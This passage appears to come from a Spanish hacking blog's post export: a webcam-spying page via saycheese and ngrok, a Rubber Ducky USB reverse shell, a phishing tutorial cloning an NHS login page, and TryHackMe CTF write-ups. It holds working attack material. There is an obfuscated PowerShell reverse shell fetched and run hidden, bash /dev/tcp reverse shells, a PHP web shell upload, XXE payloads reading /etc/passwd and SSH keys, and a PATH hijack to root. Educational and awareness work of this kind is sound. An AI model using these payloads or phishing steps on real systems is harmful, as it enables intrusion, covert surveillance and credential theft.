la cual apunta a un servicio web que se está ejecutando en nuestra máquina local. Así podrá acceder gente al enlace que no esté en nuestra red.\nAntes que nada nos tenemos que crear una cuenta de forma gratuita en ngrok y descargárnoslo desde aquí https://dashboard.ngrok.com/get-started/setup, una vez nos hemos descargado él .tgz lo podemos descomprimir con\ntar -xvf archivo.tgz Después nos vinculamos la cuenta con el comando que sale en https://dashboard.ngrok.com/get-started/setup\nAhora ya podemos seguir con el saycheese, después de seleccionar ngrok vemos que no nos genera ningún enlace.\nSabiendo que la web corre en local por el puerto 3333 lo que tenemos que hacer es ejecutar ngrok y especificarle el puerto 3333\n./ngrok http 3333 Ahora nos ha generado un enlace el cual hace referencia a nuestro localhost:3333\nAl entrar a la web nos pide autorización para la cámara en este caso parece muy obvio que no es una web legítima, pero lo que se puede hacer es poner un index.html como el de una web que si use la cámara como cámaras online, zoom, meet\nDespués de darle autorización para el uso de la cámara.desde la terminal del atacante vemos como está empezando a recibir imágenes\n","date":"2023-02-05","id":52,"permalink":"/blog/como-pueden-espiarte-con-solo-pinchar-un-enlace-saycheese/","summary":"¿Qué es la herramienta saycheese? La herramienta saycheese lo que hace es crear una web simple, la cual saca fotos desde la webcam de la víctima que la abre","tags":[],"title":"Como pueden espiarte con solo pinchar un enlace (saycheese)"},{"content":"","date":"2023-02-05","id":53,"permalink":"/tags/hak5/","summary":"","tags":[],"title":"hak5"},{"content":"","date":"2023-02-05","id":54,"permalink":"/tags/reverse-shell/","summary":"","tags":[],"title":"Reverse shell"},{"content":"¿Qué es una reverse shell? Una reverse shell (conexión inversa), es una técnica utilizada en hacking para obtener acceso remoto a un dispositivo comprometido.\n\u0026ldquo;Esquema sacado de https://sshteam.com/en/conexiones-inversas-y-directas/\u0026rdquo;\nReverse shell a un windows con RubberDucky inject.ps1 Para crear la Reverse shell vamos a usar este script de PowerShell hecho por 0iphor13, nos lo tenemos que guardar en un archivo llamado inject.ps1\n$I=\u0026#39;192.168.1.142\u0026#39;;$P=443;$0LVhbQ=[TyPE](\u0026#39;tExT\u0026#39;+\u0026#39;.enCOD\u0026#39;+\u0026#39;InG\u0026#39;);$C=.(\u0026#39;New\u0026#39;+\u0026#39;-Obj\u0026#39;+\u0026#39;ect\u0026#39;) System.Net.Sockets.TCPClient($I,$P);$S=$C.GetStream();[byte[]]$b=0..65535|\u0026amp;(\u0026#39;%\u0026#39;){0};while(($i=$S.Read($b,0,$b.Length))-ne 0){;$d=(\u0026amp;(\u0026#39;New\u0026#39;+\u0026#39;-Ob\u0026#39;+\u0026#39;ject\u0026#39;) -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$X=(\u0026amp;(\u0026#39;ie\u0026#39;+\u0026#39;x\u0026#39;) $d 2\u0026gt;\u0026amp;1 | .(\u0026#39;Out\u0026#39;+\u0026#39;-St\u0026#39;+\u0026#39;ring\u0026#39;));$Z=$X+\u0026#39;ReverseDucky \u0026#39;+(\u0026amp;(\u0026#39;g\u0026#39;+\u0026#39;l\u0026#39;))+\u0026#39;~ \u0026#39;;$sbt=($0lvHBq::ASCII).GetBytes($Z);$S.Write($sbt,0,$sbt.Length);$S.Flush()};$C.Close() La variable \u0026lsquo;I\u0026rsquo; tiene que ser la ip del atacante\n$I=\u0026#39;192.168.1.142\u0026#39; La variable \u0026lsquo;P\u0026rsquo; tiene que ser el puerto por el cual vamos a estar en escucha, en este caso el puerto 443\n$P=443 Ahora desde la carpeta que tenemos guardado el script vamos a abrir un servidor con python por el puerto 80 para podernos pasar el script a la máquina víctima\nsudo python3 -m http.server 80 Rubber Ducky payload Por parte del rubberducky vamos a usar este payload\nDELAY 2500 GUI r DELAY 1000 STRING powershell -w hidden \u0026#34;IEX(New-Object Net.WebClient).downloadString(\u0026#39;http://192.168.1.142/inject.ps1\u0026#39;)\u0026#34; ENTER Este payload lo que hace es:\nEsperar 2,5 segundos Presionar windows + r para abrir el lanzador de windows Esperar 1 segundo para que se abra el lanzador de windows Ejecuta un comando que lo que hace es descargarse el inject.ps1 de la máquina del atacante desde el servidor que hemos montado previamente en python y lo ejecuta en segundo plano sin mostrar nada por pantalla Para pasarlo a binario vamos a usar la web https://ducktoolkit.com/encode, vamos a pegar ahí el script, seleccionamos el idioma que tenga el teclado de la victima, lo descargamos y lo pasamos a la micro sd del rubber ducky.\nPor último solo nos queda ponernos en escucha con netcat por el puerto 443.\nsudo nc -nlvp 443 Resultado Después de conectar el USB a la máquina víctima, en el servidor de python podemos ver como el rubber ducky a hecho una petición GET desde la máquina víctima\nDesde la terminal que estábamos en escucha por el puerto 443 con nc podemos ver que hemos recibido una conexión de la máquina víctima\nMientras que desde la máquina víctima no se ve nada raro\nVideo del resultado:\n","date":"2023-02-05","id":55,"permalink":"/blog/reverse-shell-con-el-usb-rubberducky/","summary":"¿Qué es una reverse shell? Una reverse shell (conexión inversa), es una técnica utilizada en hacking para obtener acceso remoto a un dispositivo comprometido.","tags":["USB","hak5","Reverse shell"],"title":"Reverse shell con el USB RubberDucky"},{"content":"","date":"2023-02-05","id":56,"permalink":"/tags/usb/","summary":"","tags":[],"title":"USB"},{"content":"","date":"2023-02-04","id":57,"permalink":"/tags/ingenieria-social/","summary":"","tags":[],"title":"Ingenieria social"},{"content":"¿Qué es? Consiste en crear un correo, web o mensaje que se haga pasar por una empresa legítima, para que la víctima introduzca datos importantes creyéndose que lo está haciendo en el sitio real\nIngeniería social Se entiende como ingeniería social al conjunto de técnicas para manipular o engañar a las personas para infectar con archivos maliciosos u obtener información o acceso a ordenadores, redes, empresas\u0026hellip;\nTipos de phishing 📲 Smishing\nSe realiza a través de mensajes de texto\n☎️ Vishing\nSe realiza mediante llamadas telefónicas\n💿 Baiting\nSe realiza mediante USB, DVD, CD que pondrá un archivo malicioso en el dispositivo\nEjemplo de ingeniería social usando la técnica baiting en la serie Mr.Robot\nExisten varias herramientas para hacer phishings como Social-Engineer Toolkit que ya viene instalada con kali linux y parrot. Aparte de hacer phishing también sirve para hacer muchos tipos de ataques de ingeniería social. Zphisher es otra herramienta de phishing que ya viene con muchas plantillas de webs típicas instaladas\nSimulación de un phishing web con Social-Engineer Toolkit Esto se hace con fines educativos para concienciar de los peligros de internet\ngithub.com/trustedsec/social-engineer-toolki\nPara este ejemplo vamos a usar Social-Engineer Toolkit.\nLa web que vamos a clonar va a ser https://www.nhseportfolios.org/Anon/Login/Login.aspx\nY nuestro target va a ser pepito\nConfiguración Social-Engineer Toolkit Al ejecutarlo nos aparece un menu con varias opciones, vamos a escojer \u0026ldquo;Social-Engineering Attacks\u0026rdquo;, \u0026ldquo;Website Attack Vectors\u0026rdquo; y \u0026ldquo;Credential Harvester Attack Method\u0026rdquo;. Ahora nos deja 3 opciones\nWeb Templates\nEsta opción sirve para clonar webs que el programa ya tiene clonadas. Nos da la opción de Google y Twitter\nTemplate de google:\nCustom Import\nEsta opción nos permite crear la web desde 0 o importarla de forma manual. Para pasársela al programa tendremos que poner la ruta completa de donde están los archivos de la web en nuestra máquina\nSite cloner\nEsta es la opción más interesante, ya que con solo poner el enlace de una web ya nos la clona\nComo nosotros queremos clonar la web de nhseportfolios.org vamos a elegir la opción de site cloner y le proporcionamos la url\nset:webattack\u0026gt; Enter the url to clone:https://www.nhseportfolios.org/Anon/Login/Login.aspx Ahora en local vamos a tener corriendo una web exactamente igual que la original y el programa se va a quedar en escucha de conexiones\nResultado Desde el punto de vista de la víctima ahora al clicar en este enlace http://ip_atacante va a ver el clon de la web original\nAl poner credenciales. ¡Desde el lado del atacante en la terminal que estaba corriendo el programa vemos que ha reportado las credenciales!\nPOSSIBLE USERNAME FIELD FOUND: $UserName=pepito POSSIBLE PASSWORD FIELD FOUND: $Password=secret123 Este método funciona, pero no queda muy creíble que la url sea una ip.\nHay varias formas para hacerlo más creíble como por ejemplo cambiando el /etc/hosts, alojarla a un servidor o combinarla con un qr\nCambiar el /etc/hosts Hay un archivo en linux /etc/hosts/ y en windows C:\\Windows\\System32\\drivers\\etc\\hosts. Este archivo se usa para asociar ip\u0026rsquo;s a dominios. Si se añade una línea con lo siguiente\n192.168.1.142 nhseportfolios.org #IP atacante Dominio Ahora cada vez que entremos a nhseportfolios.org nos va a mandar a la 192.168.1.142. Este método funciona, pero no es muy práctico porque solo lo puedes hacer con alguien que esté en tu misma red y tienes que cambiar el etc/hosts que para hacerlo necesitas permisos de administrador en la máquina víctima, aunque con un troyano se podría cambiar. Pero no es muy eficiente\nMail La forma más típica de manda webs falsas es por correo. Los atacantes mandan los correos intentando crear una situación de pánico a la víctima para que se ponga nerviosa y clique en el enlace\nQR Otra forma de colar el phishing sería mediante un codigó qr que lleve a la página que hemos clonado. Esto lo podemos hacer en la misma herramienta Social-Engineer Toolkit en el apartado de qr\nNos pide la web que queremos que nos lleve el qr\nVemos que nos ha generado la imagen del qr y la ha guardado en /root/.set/reports/qrcode_attack.png\nEsto se puede combinar con un correo.\nComo detectarlo Antes de clicar o descargar algo de un correo se tienen que seguir estos pasos\nComprobar que la dirección es de un sitio conocido y comprobar que no tenga letras de más, letras por números, muchos puntos\u0026hellip;\nAntes de clicar a cualquier enlace es importante verificar que ese sea el original de la empresa. Si es un botón y no se ve el enlace se puede hacer \u0026ldquo;hovering\u0026rdquo; que es pasar por encima el ratón sin clicar para que salga el enlace abajo a la izquierda. Es recomendable acceder manualmente a la web y no con enlaces de correo\nMuchos ataques los hacen con traductores así que la sintaxis de los mensajes de phishing no suele ser muy buena\nRecuerda que la vulnerabilidad más grande de un dispositivo es el usuario\nComo evitarlo Es recomendable tener un antivirus en el pc, actualmente casi todos los antivirus cuentan con la opción de bloquear posibles phishings\nSi eres el técnico de una empresa lo que puedes hacer es desde el antivirus bloquear todas las posibles combinaciones que puede haber de un dominio. Por ejemplo si estás en una empresa de un banco y los empleados siempre para trabajar tienen que acceder a bancoseguro123.com puedes con la herramienta urlcrazy generar dominios parecidos al original y meterlos en una blacklist del antivirus, Siempre que no se bloquee una web legitima porque podria afectar negativamente a los trabajadores\n$ urlcrazy -r bancoseguro123.com Typo Type Typo Domain ---------------------------------------------------------------- Original bancoseguro123.com Character Omission bacoseguro123.com Character Omission bancoeguro123.com Character Omission bancosegro123.com Character Omission bancoseguo123.com Character Omission bancosegur123.com Character Omission bancoseguro12.com Character Omission bancoseguro123.cm Character Omission bancoseguro123.co Character Omission bancoseguro13.com Character Omission bancoseguro23.com Character Omission bancoseuro123.com Character Omission bancosguro123.com Character Omission bancseguro123.com Character Omission banoseguro123.com Character Omission bncoseguro123.com Character Repeat baancoseguro123.com Character Repeat banccoseguro123.com ... ... Que hacer si ya has caído en un phishing Lo primero es ponerte en contacto con el soporte de la empresa, si lo que te han robado son las contraseñas cámbialas y si tienes la misma contraseña en otra web también es importante cambiarla. Por último se puede denunciar a la policía como un delito de fraude\n","date":"2023-02-04","id":58,"permalink":"/blog/phishing/","summary":"¿Qué es? Consiste en crear un correo, web o mensaje que se haga pasar por una empresa legítima, para que la víctima introduzca datos importantes creyéndose que lo está haciendo en el sitio real","tags":["Ingenieria social"],"title":"Phishing"},{"content":"","date":"2023-01-20","id":59,"permalink":"/tags/file-upload/","summary":"","tags":[],"title":"file upload"},{"content":"https://tryhackme.com/room/startup\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.76.5\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n\u0026gt; ping -c 1 10.10.76.5 PING 10.10.76.5 (10.10.76.5) 56(84) bytes of data. 64 bytes from 10.10.76.5: icmp_seq=1 ttl=63 time=116 ms --- 10.10.76.5 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 116.037/116.037/116.037/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.76.5 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.76.5 5 │ [*] Open ports: 21,22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p22,80 -sC -sV 10.10.76.5 PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) | drwxrwxrwx 2 65534 65534 4096 Nov 12 2020 ftp [NSE: writeable] | -rw-r--r-- 1 0 0 251631 Nov 12 2020 important.jpg |_-rw-r--r-- 1 0 0 208 Nov 12 2020 notice.txt | ftp-syst: | STAT: | FTP server status: | Connected to 10.18.108.198 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b9a60b841d2201a401304843612bab94 (RSA) | 256 ec13258c182036e6ce90e1626eba2be (ECDSA) |_ 256 a2ff2a7281aaa29f55a4dc9223e6b43f (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Maintenance Puerto 21 (ftp) El nmap ha reportado que nos podemos conectar por ftp como anonymous. Dentro del ftp hay tres archivos: .test_log, important.jpg y notice.txt, también hay un directorio llamado ftp en el cual tenemos permisos de escritura.\nNos pasamos los tres archivos con get \u0026quot;archivo\u0026quot; para analizarlos desde nuestra máquina. Ningún archivo contienen información relevante\nPuerto 80 (http) Subdirectorios Empezamos con un escaneo de subdirectorios, vamos a usar dirb\ndirb 10.10.76.5 Nos encuentra el subdirectorio files. Dentro de files vemos que hay los mismos archivos que en el ftp, teniendo en cuenta que en el ftp había una carpeta en la cual podíamos subir archivos, podemos probar de subir una reverse shell con php para después ejecutarla desde la web.\nIntrusión Nos bajamos el .php\nwget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php Es importante cambiar las líneas de ip y puerto.\nComo normalmente la extensión .php está bloqueada, lo vamos a cambiar a .phtml\nAhora ya nos podemos volver a conectar por ftp y dentro de la carpeta ftp subir el .phtml con put\nPor último nos ponemos en escucha por el puerto 443 y desde la web ejecutamos el archivo. Ya tenemos la reverse shell\nTratamiento de tty Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm Escalda de privilegios Lennie En /incidents vemos un archivo el cual parece que contiene un historial de los comandos que se han ejecutado, buscando un poco vemos un sitio donde salen unas credenciales\u0026hellip;\nRoot Con la herramienta pspy podemos ver como se ejecuta automáticamente como root el archivo /home/lennie/scripts/planner.sh.\nNo tenemos permisos de escritura para este archivo, pero ese archivo ejecuta otro archivo: /etc/printf.sh, en este sí que tenemos permisos de escritura.\nDentro vamos a poner bash -c \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/442 0\u0026gt;\u0026amp;1\u0026quot; y nos vamos a poner en escucha por el puerto 442.\n¡Recibimos la conexión y YA SOMOS ROOT!!!!!\n","date":"2023-01-20","id":60,"permalink":"/writeups/tryhackme/startup/","summary":"https://tryhackme.com/room/startup\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.76.5\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","cron","file upload"],"title":"Startup"},{"content":"","date":"2023-01-19","id":61,"permalink":"/tags/cve-2019-15107/","summary":"","tags":[],"title":"CVE-2019-15107"},{"content":"","date":"2023-01-19","id":62,"permalink":"/tags/cve-2019-15231/","summary":"","tags":[],"title":"CVE-2019-15231"},{"content":"https://tryhackme.com/room/source\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.16.237\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\nping -c 1 10.10.16.237 PING 10.10.16.237 (10.10.16.237) 56(84) bytes of data. 64 bytes from 10.10.16.237: icmp_seq=1 ttl=63 time=61.1 ms --- 10.10.16.237 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 61.096/61.096/61.096/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.16.237 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.186.98 5 │ [*] Open ports: 22,10000 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\nnsmap -p22,10000 -sC -sV 10.10.16.237 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b74cd0bde27b1b15722764562915ea23 (RSA) | 256 b78523114f44fa22008e40775ecf287c (ECDSA) |_ 256 a9fe4b82bf893459365becdac2d395ce (ED25519) 10000/tcp open http MiniServ 1.890 (Webmin httpd) |_http-title: Site doesn\u0026#39;t have a title (text/html; Charset=iso-8859-1). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Puerto 10000 El nmap ha reportado la versión del puerto 10000 (Webmin 1.890) la cual con una búsqueda rápida por google podemos ver que es vulnerable. He encontrado en github un exploit: https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE, al ejecutarlo podemos ejecutar comandos como root en el servidor, pero necesitamos pasarlos por un url encoder antes de mandarlos.\nIntrusión Como podemos ejecutar comandos como root en el servidor podemos ya directamente ver las 2 flags o mandarnos una reverse shell.\nNos ponemos en escucha por el puerto 443\nnc -nlvp 443 Ahora enviamos con el exploit el comando para mandarnos una reverse shell bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.237%2F443%200%3E%261%22. Y ya somos root\n","date":"2023-01-19","id":63,"permalink":"/writeups/tryhackme/source/","summary":"https://tryhackme.com/room/source\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.16.237\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","CVE-2019-15107","CVE-2019-15231"],"title":"Source"},{"content":"","date":"2023-01-18","id":64,"permalink":"/tags/mediana/","summary":"","tags":[],"title":"Mediana"},{"content":"https://tryhackme.com/room/mustacchio\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.3.160\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\nping -c 1 10.10.131.18 PING 10.10.131.18 (10.10.131.18) 56(84) bytes of data. 64 bytes from 10.10.131.18: icmp_seq=1 ttl=63 time=372 ms --- 10.10.131.18 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 371.643/371.643/371.643/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.131.18 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.131.18 5 │ [*] Open ports: 22,80,8765 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p22,80,8765 -sC -sV 10.10.131.18 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 581b0c0ffacf05be4cc07af1f188611c (RSA) | 256 3cfce8a37e039a302c77e00a1ce452e6 (ECDSA) |_ 256 9d59c6c779c554c41daae4d184710192 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-robots.txt: 1 disallowed entry |_/ |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Mustacchio | Home 8765/tcp open http nginx 1.10.3 (Ubuntu) |_http-title: Mustacchio | Login |_http-server-header: nginx/1.10.3 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Puerto 80 Al entrar a la web lo primero que vemos es lo siguiente:\nCon wfuzz vamos a buscar subdirectorios\nwfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt http://10.10.131.18/FUZZ Entre todos los que encuentra hay uno llamdo custom que dentro tiene una carpeta llamada js y css. Dentro de js hay un archivo llamado users.bak. Al descargarnoslo con un strings podemos ver un usuario (admin) y un hash\nEse hash podemos probar de romperlo con la herramienta search the hash\nPuerto 8765 Dentro de este puerto hay otra web con un panel de login al cual podemos entrar con las credenciales que hemos conseguido antes. Al entrar vemos lo siguiente:\nSi lo dejamos en blanco sale una notificación que dice que tenemos que poner código XML\nViendo que abajo salen tres variables (Nombre, Autor y Comentario) podemos probar de poner un código XML con esos apartados.\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;comment\u0026gt; \u0026lt;name\u0026gt;test1\u0026lt;/name\u0026gt; \u0026lt;author\u0026gt;test2\u0026lt;/author\u0026gt; \u0026lt;com\u0026gt;test3\u0026lt;/com\u0026gt; \u0026lt;/comment\u0026gt; Podemos probar de hacer una inyeccion xxe con el siguiente código xml para que muestre el archivo /etc/passwd\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY testxxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;comment\u0026gt; \u0026lt;name\u0026gt;\u0026amp;testxxe;\u0026lt;/name\u0026gt; \u0026lt;author\u0026gt;test2\u0026lt;/author\u0026gt; \u0026lt;com\u0026gt;test3\u0026lt;/com\u0026gt; \u0026lt;/comment\u0026gt; ¡Funciona!\nUsando lo mismo podemos ver la \u0026ldquo;RSA PRIVATE KEY\u0026rdquo;. Esta vez en vez del \u0026ldquo;file://\u0026rdquo; he usado \u0026ldquo;php://filter/convert.base64-encode/resource=/\u0026rdquo; para que no pierda la estructura.\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY testxxe SYSTEM \u0026#34;php://filter/convert.base64-encode/resource=/home/barry/.ssh/id_rsa\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;comment\u0026gt; \u0026lt;name\u0026gt;\u0026amp;testxxe;\u0026lt;/name\u0026gt; \u0026lt;author\u0026gt;test2\u0026lt;/author\u0026gt; \u0026lt;com\u0026gt;test3\u0026lt;/com\u0026gt; \u0026lt;/comment\u0026gt; La respuesta está encriptada con base64. La podemos desencriptar de la siguiente forma\necho \u0026#34;Respuesta en base64\u0026#34; | base64 -d La respuesta la guardamos en un archivo llamado id_rsa y le hacemos un chmod 400 id_rsa.\nLa \u0026ldquo;RSA PRIVATE KEY\u0026rdquo; está encriptada, la podemos desencriptar con john:\nssh2john id_rsa \u0026gt; hash.txt john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt Ya tenemos unas credenciales para conectarnos por ssh\nEscalada de privilegios Dentro de /home/joe hay un archivo interesante\nbarry@mustacchio:/home/joe# file live_log live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped Con el comando strings podemos ver cadenas de texto, En una línea se ve como ejecuta tail sin poner la ruta completa, nos podemos aprovechar de esto creando un tail en /tmp y añadiendo el /tmp en el path, de esta forma podremos ejecutar lo que queramos como root.\necho \u0026#34;/bin/bash\u0026#34; \u0026gt; /tmp/tail chmod +x /tmp/tail export PATH=/tmp:$PATH ¡Ya somos root!\n","date":"2023-01-18","id":65,"permalink":"/writeups/tryhackme/mustacchio/","summary":"https://tryhackme.com/room/mustacchio\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.3.160\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Mediana","Linux","xxe"],"title":"Mustacchio"},{"content":"","date":"2023-01-18","id":66,"permalink":"/tags/xxe/","summary":"","tags":[],"title":"xxe"},{"content":"","date":"2023-01-11","id":67,"permalink":"/tags/bash/","summary":"","tags":[],"title":"bash"},{"content":"","date":"2023-01-11","id":68,"permalink":"/tags/perl/","summary":"","tags":[],"title":"perl"},{"content":"https://tryhackme.com/room/wonderland\nIP Atacante = 10.10.10.10\nIP Víctima = 10.10.3.160\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.186.98 PING 10.10.186.98 (10.10.186.98) 56(84) bytes of data. 64 bytes from 10.10.186.98: icmp_seq=1 ttl=63 time=45.4 ms --- 10.10.186.98 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 45.355/45.355/45.355/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.126.65 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.186.98 5 │ [*] Open ports: 22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p22,80 -sC -sV 10.10.186.98 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8eeefb96cead70dd05a93b0db071b863 (RSA) | 256 7a927944164f204350a9a847e2c2be84 (ECDSA) |_ 256 000b8044e63d4b6947922c55147e2ac9 (ED25519) 80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Follow the white rabbit. Web (Puerto 80) Reconocimiento web Al entrar a la web lo primero que vemos es lo siguiente\nCon ctrl + u podemos ver el codigo de la web. Vemos que saca la foto de un subdirectorio llamado img\n\u0026lt;img src=\u0026#34;/img/white_rabbit_1.jpg\u0026#34; style=\u0026#34;height: 50rem;\u0026#34;\u0026gt; Al entrar al directorio /img vemos que hay 2 fotos 